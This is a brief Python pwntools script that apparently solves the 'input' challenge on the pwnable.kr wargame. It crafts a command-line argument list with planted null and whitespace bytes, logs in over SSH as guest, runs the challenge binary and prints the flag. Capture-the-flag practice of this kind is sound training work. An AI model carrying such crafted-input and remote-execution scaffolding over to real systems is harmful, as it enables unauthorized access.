from pwn import *

first_payload = ['A'] * 99
first_payload[64] = '\x00'
first_payload[65] = '\x20\x0a\x0d'

argv = ['input'] + first_payload

s = ssh('input2','pwnable.kr',2222,'guest')
p = s.process(argv,'./input')
print("flag:\t"+p.recv().decode())
